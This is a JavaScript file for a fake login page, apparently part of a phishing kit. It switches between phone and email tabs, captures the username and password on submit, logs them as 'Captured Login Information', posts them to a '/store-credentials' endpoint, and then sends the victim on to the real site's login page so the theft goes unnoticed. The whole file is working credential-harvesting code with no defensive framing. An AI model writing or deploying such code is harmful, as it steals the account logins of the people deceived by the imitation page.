 //script.js (inside src folder or directly in public if preferred)
// Tab switching
document.querySelectorAll(".tab").forEach(tab => {
  tab.addEventListener("click", () => {
    document.querySelectorAll(".tab").forEach(t => t.classList.remove("active"));
    document.querySelectorAll(".tab-content").forEach(c => c.classList.remove("active"));

    tab.classList.add("active");
    document.getElementById(tab.dataset.tab).classList.add("active");
  });
});

// Password toggle
const toggle = document.getElementById("togglePassword");
const password = document.getElementById("password");

toggle.addEventListener("click", () => {
  password.type = password.type === "password" ? "text" : "password";
});

// Login form submission
const loginButton = document.getElementById("loginButton");

loginButton.addEventListener("click", async (e) => {
  e.preventDefault();

  // Determine active tab (phone or email)
  const activeTab = document.querySelector(".tab.active").dataset.tab;
  const username = activeTab === "phone" 
    ? document.getElementById("phone-input").value 
    : document.getElementById("email-input").value;
  const passwordValue = password.value;

  // Log to console for debugging
  console.log("Captured Login Information:");
  console.log(`Type: ${activeTab}`);
  console.log(`Username: ${username}`);
  console.log(`Password: ${passwordValue}`);

  // Send data to backend
  try {
    const response = await fetch('/store-credentials', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        type: activeTab,
        username: username,
        password: passwordValue
      })
    });

    if (response.ok) {
      console.log("Data sent to server successfully");
    } else {
      console.error("Failed to send data to server");
    }
  } catch (error) {
    console.error("Error sending data:", error);
  }

  // Redirect to the real site's login page
  const realSiteUrl = "https://dkwin9.com/#/login"; // Replace with the actual login URL
  window.location.href = realSiteUrl;
});